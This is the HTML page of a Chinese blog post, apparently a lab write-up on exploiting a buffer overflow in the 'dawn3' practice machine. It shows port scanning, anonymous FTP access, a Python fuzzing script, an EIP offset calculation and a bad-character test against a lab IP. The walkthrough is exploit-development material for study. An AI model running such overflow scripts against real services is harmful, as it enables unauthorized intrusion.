@@ -1,0 +1,770 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="I3eg1nner">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="dawn3 靶机这台靶机本质上和 Brainpan1 是基本一致的，无论是利用手法，还是思路，基本一样，属于缓冲区溢出漏洞的经典例子，建议结合红队笔记对于 Brainpan1的讲解仔细消化。 信息收集12345678910┌──(kali㉿kali)-[~&#x2F;Downloads&#x2F;dawn3]└─$ sudo nmap --min-rate 10000 -p- 192.168.56.148Starti">
+<meta property="og:type" content="article">
+<meta property="og:title" content="dawn3 靶机">
+<meta property="og:url" content="https://i3eg1nner.github.io/2023/10/4a11524f2c39.html">
+<meta property="og:site_name" content="I3eg1nner&#39;s blog">
+<meta property="og:description" content="dawn3 靶机这台靶机本质上和 Brainpan1 是基本一致的，无论是利用手法，还是思路，基本一样，属于缓冲区溢出漏洞的经典例子，建议结合红队笔记对于 Brainpan1的讲解仔细消化。 信息收集12345678910┌──(kali㉿kali)-[~&#x2F;Downloads&#x2F;dawn3]└─$ sudo nmap --min-rate 10000 -p- 192.168.56.148Starti">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/003c0f87f77c606de8e66a74d09d199b_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/638c8081997047cd8c6131f7421c622e_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/5ff4ca36b793b6999b1012c77f3916e4_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/bdf598f6c9eac896380ff58e13f0de41_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/7f1df6885bcc5208b9bcd8f4c7cbcff1_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/b279ea7135cbc0637731da6602bf63c8_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/7645ab7f619c774e6ec6b309166c5126_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/f2cf72b123acc1419dd5e82522b412e5_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/12a3c7e31855dd85bc1b8cde099e69cd_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/c85584b52be01e8dd3d0bd20c254db1d_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/b1d17e8c84542d84adaad67a905cdeeb_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/0addb661a7195dcf465891b3b5e7c84f_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/eb084e58579ecef03626040b5db66377_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/a67608c2ac91ab4fe157c9223222ddfe_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/e8755f53df670aa3635bbd461148a4dc_MD5.png">
+<meta property="article:published_time" content="2023-10-09T03:33:00.000Z">
+<meta property="article:modified_time" content="2023-10-09T09:05:50.895Z">
+<meta property="article:author" content="I3eg1nner">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://i3eg1nner.github.io/pic/003c0f87f77c606de8e66a74d09d199b_MD5.png">
+  
+  
+  
+  <title>dawn3 靶机 - I3eg1nner&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"i3eg1nner.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>I3eg1nner</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="dawn3 靶机"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-10-09 11:33" pubdate>
+          2023年10月9日 中午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          13k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          105 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">dawn3 靶机</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="dawn3-靶机"><a href="#dawn3-靶机" class="headerlink" title="dawn3 靶机"></a>dawn3 靶机</h1><p>这台靶机本质上和 Brainpan1 是基本一致的，无论是利用手法，还是思路，基本一样，属于缓冲区溢出漏洞的经典例子，建议结合红队笔记对于 Brainpan1的讲解仔细消化。</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/dawn3]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.56.148<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-09 01:27 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.148<br>Host is up (0.00036s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT     STATE    SERVICE<br>2100/tcp open     amiganetfs<br>6812/tcp filtered unknown<br>MAC Address: 08:00:27:06:69:F3 (Oracle VirtualBox virtual NIC)<br></code></pre></td></tr></table></figure>
+
+<p>开放了 2100, 6812 端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/dawn3]<br>└─$ sudo nmap -sT -sV -sC -O -p2100,6812 192.168.56.148<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-09 03:45 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.148<br>Host is up (0.00032s latency).<br><br>PORT     STATE SERVICE VERSION<br>2100/tcp open  ftp     pyftpdlib 1.5.6<br>| ftp-syst: <br>|   STAT: <br>| FTP server status:<br>|  Connected to: 192.168.56.148:2100<br>|  Waiting <span class="hljs-keyword">for</span> username.<br>|  TYPE: ASCII; STRUcture: File; MODE: Stream<br>|  Data connection closed.<br>|_End of status.<br>| ftp-anon: Anonymous FTP login allowed (FTP code 230)<br>|_-rwsrwxrwx   1 dawn3    dawn3      292728 Mar 08  2020 dawn3.exe [NSE: writeable]<br>6812/tcp open  unknown<br>MAC Address: 08:00:27:06:69:F3 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br></code></pre></td></tr></table></figure>
+
+<p>FTP 可匿名登录，操作系统是 Linux ，寻找敏感文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/dawn3]<br>└─$ ftp 192.168.56.148 2100<br>Connected to 192.168.56.148.<br>220 pyftpdlib 1.5.6 ready.<br>Name (192.168.56.148:kali): anonymous<br>331 Username ok, send password.<br>Password: <br>230 Login successful.<br>Remote system <span class="hljs-built_in">type</span> is UNIX.<br>Using binary mode to transfer files.<br>ftp&gt; binary<br>200 Type <span class="hljs-built_in">set</span> to: Binary.<br>ftp&gt; <span class="hljs-built_in">ls</span><br>229 Entering extended passive mode (|||44611|).<br>125 Data connection already open. Transfer starting.<br>-rwsrwxrwx   1 dawn3    dawn3      292728 Mar 08  2020 dawn3.exe<br>226 Transfer complete.<br></code></pre></td></tr></table></figure>
+
+<p>发现了一个 exe 文件，下载到本地查看</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/dawn3]<br>└─$ file dawn3.exe         <br>dawn3.exe: PE32 executable (console) Intel 80386, <span class="hljs-keyword">for</span> MS Windows, 15 sections<br></code></pre></td></tr></table></figure>
+
+<p>32 位 Windows 操作系统的可执行文件格式，控制台应用程序，x86 架构。</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌──(kali㉿kali)-[~/Downloads/dawn3]<br>└─$ binwalk dawn3.exe   <br><br><span class="hljs-type">DECIMAL</span>       HEXADECIMAL     DESCRIPTION<br><span class="hljs-comment">--------------------------------------------------------------------------------</span><br><span class="hljs-number">0</span>             <span class="hljs-number">0x0</span>             Microsoft executable, portable (PE)<br><span class="hljs-number">10995</span>         <span class="hljs-number">0x2AF3</span>          mcrypt <span class="hljs-number">2.5</span> <span class="hljs-keyword">encrypted</span> data, algorithm: &quot;nitializeCriticalSection&quot;, keysize: <span class="hljs-number">973</span> bytes, mode: &quot;L&quot;,<br><span class="hljs-number">257837</span>        <span class="hljs-number">0x3EF2D</span>         mcrypt <span class="hljs-number">2.2</span> <span class="hljs-keyword">encrypted</span> data, algorithm: blowfish<span class="hljs-number">-448</span>, mode: CBC, keymode: MD5 hash<br><span class="hljs-number">257932</span>        <span class="hljs-number">0x3EF8C</span>         mcrypt <span class="hljs-number">2.2</span> <span class="hljs-keyword">encrypted</span> data, algorithm: blowfish<span class="hljs-number">-448</span>, mode: CBC, keymode: <span class="hljs-number">4</span>bit<br></code></pre></td></tr></table></figure>
+
+<p>程序应该问题不大，不过还是建议在虚拟机里运行，而且测试发现 win11 上运行该程序可能会有异常，之后是在 Windows7 上运行测试的</p>
+<h2 id="缓冲区溢出漏洞"><a href="#缓冲区溢出漏洞" class="headerlink" title="缓冲区溢出漏洞"></a>缓冲区溢出漏洞</h2><p>strings 查看可读字符</p>
+<p><img src="/pic/003c0f87f77c606de8e66a74d09d199b_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>对于输入的参数，没有过滤，可能存在缓冲区溢出漏洞。这里尝试了一下 200 字符作为输入</p>
+<p><img src="/pic/638c8081997047cd8c6131f7421c622e_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>会直接打印，那接下来手动进行测试</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">python2 -c <span class="hljs-string">&#x27;print &quot;A&quot;*500&#x27;</span><br><br>python2 -c <span class="hljs-string">&#x27;print &quot;A&quot;*600&#x27;</span><br><br>telnet 192.1.1.155 6812<br></code></pre></td></tr></table></figure>
+
+<p><img src="/pic/5ff4ca36b793b6999b1012c77f3916e4_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>输入 600 字符时，程序崩溃</p>
+<p><img src="/pic/bdf598f6c9eac896380ff58e13f0de41_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>使用 Brianpan1 靶机的脚本，略微修改一下来测试此程序。前面我们已经确定了 600 个字符时，程序崩溃，接下来我们要确定在哪一个字节的位置出现了缓冲区溢出。我们需要使用 Immunity Debugger 工具来进行操作，同时需要安装 mona 插件，在谷歌上搜就行。</p>
+<p>使用该工具打开目标 exe，刚开始只是加载，右下角显示状态是 pause，当我们点击运行的时候，才会真正运行，右下角的状态变为Running</p>
+<p><img src="/pic/7f1df6885bcc5208b9bcd8f4c7cbcff1_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>同时生成方便定位的 600 个字符</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/dawn3]<br>└─$ msf-pattern_create -l 600<br>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9<br></code></pre></td></tr></table></figure>
+
+<p>脚本来自 B 站 UP 红队笔记的视频中出现的代码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/usr/bin/python</span><br>import socket<br>import time<br>import sys<br><br>size = 100<br><br>try:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;\n[+] Send evil buffer so many bytes&quot;</span><br>        buffer = <span class="hljs-string">&#x27;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9&#x27;</span><br>        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br>        s.connect((&quot;<span class="hljs-number">192.1</span>.<span class="hljs-number">1.155</span>&quot;,<span class="hljs-number">6812</span>))<br>        s.send(buffer)<br>        s.close()<br><br>        size+=100<br>        time.sleep(3)<br><br>except:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;\n[+] Could not connect.&quot;</span><br>        sys.exit()<br><br></code></pre></td></tr></table></figure>
+
+<p>再次查看 Immunity Debugger</p>
+<p><img src="/pic/b279ea7135cbc0637731da6602bf63c8_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>EIP 的值，也就是指向下一条指令的地址。控制了这个位置，我们就挟持了程序的执行流</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/dawn3]<br>└─$ msf-pattern_offset -l 600 -q 35724134<br>[*] Exact match at offset 524<br></code></pre></td></tr></table></figure>
+
+<p>也就是说在 524 位置处出现了缓冲区溢出到 EIP 寄存器中，我们可以通过指定前 524 个字符为 A，中间四个字符为 B，后面跟 72 个 C，这样的 600 字符作为输入，来查看 EIP 的值是否是 42（B 的十六进制是 42）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">buffer = <span class="hljs-string">&#x27;A&#x27;</span>*524 + <span class="hljs-string">&#x27;B&#x27;</span>* 4 + <span class="hljs-string">&#x27;C&#x27;</span>*72<br></code></pre></td></tr></table></figure>
+
+<p>代码上只需要修改 buffer 就行</p>
+<p><img src="/pic/7645ab7f619c774e6ec6b309166c5126_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>这样我们就彻底确定了 EIP 值的可控性</p>
+<p>接下来需要判断 ESP 的容量，因为我们之后要把代码放入其中。修改 buffer 的值，我们看看 C 字符在堆栈信息中的首尾值</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">buffer = <span class="hljs-string">&#x27;A&#x27;</span>*524 + <span class="hljs-string">&#x27;B&#x27;</span>* 4 + <span class="hljs-string">&#x27;C&#x27;</span>*600<br></code></pre></td></tr></table></figure>
+
+<p>相减得到容量字节数为 492，是足够我们存放代码的</p>
+<p><img src="/pic/f2cf72b123acc1419dd5e82522b412e5_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>下一步我们要确定是否有坏字节的问题</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/dawn3]<br>└─$ git <span class="hljs-built_in">clone</span> https://github.com/cytopia/badchars.git<br>Cloning into <span class="hljs-string">&#x27;badchars&#x27;</span>...<br>remote: Enumerating objects: 68, <span class="hljs-keyword">done</span>.<br>remote: Counting objects: 100% (68/68), <span class="hljs-keyword">done</span>.<br>remote: Compressing objects: 100% (48/48), <span class="hljs-keyword">done</span>.<br>remote: Total 68 (delta 26), reused 46 (delta 15), pack-reused 0<br>Receiving objects: 100% (68/68), 29.01 KiB | 430.00 KiB/s, <span class="hljs-keyword">done</span>.<br>Resolving deltas: 100% (26/26), <span class="hljs-keyword">done</span>.<br><br>┌──(kali㉿kali)-[~/Downloads/dawn3/badchars]<br>└─$ ./badchars -f ruby<br>badchars = (<br>  <span class="hljs-string">&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10&quot;</span> +<br>  <span class="hljs-string">&quot;\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20&quot;</span> +<br>  <span class="hljs-string">&quot;\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30&quot;</span> +<br>  <span class="hljs-string">&quot;\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40&quot;</span> +<br>  <span class="hljs-string">&quot;\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50&quot;</span> +<br>  <span class="hljs-string">&quot;\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60&quot;</span> +<br>  <span class="hljs-string">&quot;\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70&quot;</span> +<br>  <span class="hljs-string">&quot;\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80&quot;</span> +<br>  <span class="hljs-string">&quot;\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90&quot;</span> +<br>  <span class="hljs-string">&quot;\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0&quot;</span> +<br>  <span class="hljs-string">&quot;\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0&quot;</span> +<br>  <span class="hljs-string">&quot;\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0&quot;</span> +<br>  <span class="hljs-string">&quot;\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0&quot;</span> +<br>  <span class="hljs-string">&quot;\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0&quot;</span> +<br>  <span class="hljs-string">&quot;\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0&quot;</span> +<br>  <span class="hljs-string">&quot;\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;</span><br>)<br></code></pre></td></tr></table></figure>
+
+<p>将其复制到脚本文件中，然后修改 buffer 的值</p>
+<p><img src="/pic/12a3c7e31855dd85bc1b8cde099e69cd_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到整齐得排列，证明了没有坏字节</p>
